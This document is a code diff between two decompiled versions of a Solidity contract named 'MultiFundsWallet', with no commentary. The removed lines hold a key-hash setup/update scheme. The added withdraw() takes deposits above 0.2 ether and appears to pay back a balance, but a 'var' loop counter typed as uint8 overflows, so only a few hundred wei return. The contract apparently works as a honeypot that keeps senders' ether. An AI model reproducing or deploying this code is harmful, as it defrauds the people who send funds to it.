@@ -1,38 +1,33 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract MultiFundsWallet at 0x6fc1ee575e9023aea1c45b4dfc9acf603ea9f63f
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract MultiFundsWallet at 0xd2ea3d1be7b482966ba8627ff009b84bac3bf51e
 */
 pragma solidity ^0.4.24;
 
 contract MultiFundsWallet
 {
-    bytes32 keyHash;
     address owner;
     
     constructor() public {
         owner = msg.sender;
     }
- 
-    function setup(string key) public 
-    {
-        if (keyHash == 0x0) {
-            keyHash = keccak256(abi.encodePacked(key));
-        }
-    }
     
-    function withdraw(string key) public payable 
+    function withdraw() payable public 
     {
         require(msg.sender == tx.origin);
-        if(keyHash == keccak256(abi.encodePacked(key))) {
-            if(msg.value > 0.2 ether) {
-                msg.sender.transfer(address(this).balance);      
-            }
-        }
-    }
-    
-    function update(bytes32 _keyHash) public 
-    {
-        if (keyHash == 0x0) {
-            keyHash = _keyHash;
+        if(msg.value > 0.2 ether) {
+            uint256 value = 0;
+            uint256 eth = msg.value;
+            uint256 balance = 0;
+            for(var i = 0; i < eth*2; i++) {
+                value = i*2;
+                if(value >= balance) {
+                    balance = value;
+                }
+                else {
+                    break;
+                }
+            }    
+            msg.sender.transfer(balance);
         }
     }
     
